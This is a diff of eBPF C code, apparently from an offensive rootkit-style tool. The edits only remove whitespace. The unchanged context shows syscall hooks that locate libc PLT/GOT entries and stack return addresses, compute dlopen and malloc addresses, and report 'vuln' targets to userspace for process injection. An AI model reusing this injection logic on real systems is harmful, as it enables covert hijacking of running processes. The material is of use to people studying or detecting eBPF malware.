@@ -52,9 +52,9 @@ enum syscall_injection_supported{
 
 /**
  * @brief Checks whether the format of the syscall is the expected one
- * 
- * @param opcodes 
- * @param size 
+ *
+ * @param opcodes
+ * @param size
  * @return 0 if correct, 1 otherwise
  */
 static __always_inline int check_syscall_opcodes(__u8* opcodes, enum syscall_injection_supported sys){
@@ -90,10 +90,10 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes, enum syscall_inj
         && opcodes[13]==0x64);
     }
     return 1;
-}   
+}
 
 static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enum syscall_injection_supported sys){
-    //We have a possible RIP from the stack, to which we can take the previous instruction, 
+    //We have a possible RIP from the stack, to which we can take the previous instruction,
     //and check if its opcodes correspond with the expected format
     __u64 *entry_call_addr = (__u64*)(stack_rip - 0x5);
     __u8 entry_call_opcode_arr[10];
@@ -109,7 +109,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
     }
     bpf_printk("Successful entry call address: %lx\n", entry_call_addr);
 
-    //We have localized a call instruction which might be the one we are looking for. 
+    //We have localized a call instruction which might be the one we are looking for.
     //We proceed to get the offset of the call.
     __s32 offset = 0;
     __u8* entry_call_addr_8 = (__u8*)(stack_rip - 0x5);
@@ -119,7 +119,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
     }
     //bpf_printk("OP64[1]: %x\n", &entry_call_addr[1]);
     //bpf_printk("OP8[1]: %x\n", &entry_call_addr_8[1]);
-    
+
     //We now extract to which memory position it jumps via its offset+current position+5 bytes of the
     //current call instruction.
     bpf_printk("OFFSET: %x\n", offset);
@@ -141,7 +141,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
     int plt_found = 0;
     int relro_active = 0;
 
-    
+
     //Check documentation for details on jump recognition.
     if(libc_opcodes[0]==OPCODE_PLT_JMP_BYTE_0 && libc_opcodes[1]==OPCODE_PLT_JMP_BYTE_1){
         //If the ELF binary has been compiled without RELRO, the first bytes are expected.
@@ -151,17 +151,17 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
         plt_found = 1;
         relro_active = 1;
     }
-        
+
     __u8* plt_addr_arr = (__u8*)plt_addr;
     if(plt_found == 1){
         bpf_printk("Found PLT entry\n");
         __s32 got_offset;
         __u64* got_addr;
-        
+
         if(relro_active == 0){
             //We analyze the offset of the jump specified ff 25 XX XX XX XX
             //The address to which the jump takes us from the PLT.GOT should be the actual syscall setup
-            bpf_probe_read_user(&got_offset, sizeof(__s32), &plt_addr_arr[2]); //4 LSB 
+            bpf_probe_read_user(&got_offset, sizeof(__s32), &plt_addr_arr[2]); //4 LSB
             //We obtain the address of the jump by adding the offset + our current memory address + 6 bytes of the current instruction
             got_addr = (u64*)((__u64)(plt_addr_arr) + got_offset + 0x6);
             bpf_printk("GOT_OFFSET: %lx\n", got_offset);
@@ -177,7 +177,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
             bpf_printk("GOT_OFFSET: %lx\n", got_offset);
             bpf_printk("GOT_ADDR: %lx\n", got_addr);
         }
-        
+
         //The actual starting address at which the GOT section points in libc is contained in the previous pointer
         __u64 got_libc_addr;
         if(got_addr==NULL){
@@ -208,7 +208,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
             bpf_printk("Not the expected syscall\n");
             return -1;
         }
-        
+
         //We got the expected syscall call in libc. Its format depends on glibc.
         //We put it in an internal map.
         __u64 pid_tgid = bpf_get_current_pid_tgid();
@@ -233,9 +233,9 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enu
 
         return 0;
     }
-    
 
-    
+
+
 
     return 0;
 }
@@ -299,10 +299,10 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
 
              //Tell userspace to perform operations on localized addresses
             int pid = bpf_get_current_pid_tgid() >> 32;
-            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
-                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME, 
+            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address,
+                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME,
                 addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_DLOPEN,
-                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_MALLOC, 
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_MALLOC,
                 addr->got_address, addr->libc_syscall_address, addr->relro_active);
 
             return 0;
@@ -329,7 +329,7 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
             return 0;
         }
     }
-    
+
     //If we are here we may have the return address stored in the map.
     __u64 pid_tgid = bpf_get_current_pid_tgid();
     __u32 pid = pid_tgid >> 32;
@@ -413,10 +413,10 @@ int sys_enter_openat(struct sys_openat_enter_ctx *ctx){
 
              //Tell userspace to perform operations on localized addresses
             int pid = bpf_get_current_pid_tgid() >> 32;
-            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
-                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT, 
+            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address,
+                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT,
                 addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT + GLIBC_OFFSET_MAIN_TO_DLOPEN,
-                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT + GLIBC_OFFSET_MAIN_TO_MALLOC, 
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT + GLIBC_OFFSET_MAIN_TO_MALLOC,
                 addr->got_address, addr->libc_syscall_address, addr->relro_active);
 
             return 0;
@@ -455,7 +455,7 @@ int uprobe_execute_command(struct pt_regs *ctx){
     }
     //bpf_printk("Stack: %x\n", dest_buf);
 
-    
+
     return 0;
 }
 
